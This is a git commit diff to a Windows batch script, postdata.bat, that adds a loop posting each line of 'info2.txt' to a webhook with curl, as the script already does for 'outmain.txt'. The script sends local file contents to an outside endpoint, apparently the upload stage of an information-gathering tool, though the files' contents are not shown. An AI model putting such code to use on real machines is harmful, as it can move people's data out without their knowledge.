f2fe4dce78b053b4760ec8ffb5c68d4c4dce4f5b
BOBZERO-afk <thom25k5@aabenraaskoler.dk>
2026-03-26 10:39:58 +0100

    Enhance postdata.bat to read from info2.txt
    Added functionality to post data from 'info2.txt' in addition to 'outmain.txt'.

--- postdata.bat
+++ postdata.bat
@@ -3,4 +3,7 @@ set webhook=mamma
 for /f "usebackq delims=" %%A in ("outmain.txt") do (
     curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
 )
+for /f "usebackq delims=" %%A in ("info2.txt") do (
+    curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
+)
 exit /b 0
